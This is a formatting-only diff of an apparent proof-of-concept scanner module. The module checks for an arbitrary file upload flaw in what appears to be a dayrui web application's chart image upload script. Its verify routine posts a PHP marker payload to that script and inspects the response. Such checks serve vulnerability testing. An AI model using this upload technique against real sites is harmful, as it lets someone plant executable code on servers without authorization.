@@ -2,7 +2,9 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.error
+import urllib.parse
 import random
 
 
@@ -41,9 +43,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -56,7 +59,7 @@ class Poc(ABPoc):
             res = urllib.request.urlopen(req, data="<?print(md5(0x22))?>")
 
             if res.find("tmp-upload-images") == -1:
-                #print "Failed !"
+                # print "Failed !"
                 return
 
             url = self.target + '/dayrui/libraries/Chart/ofc_upload_image.php' + fileName
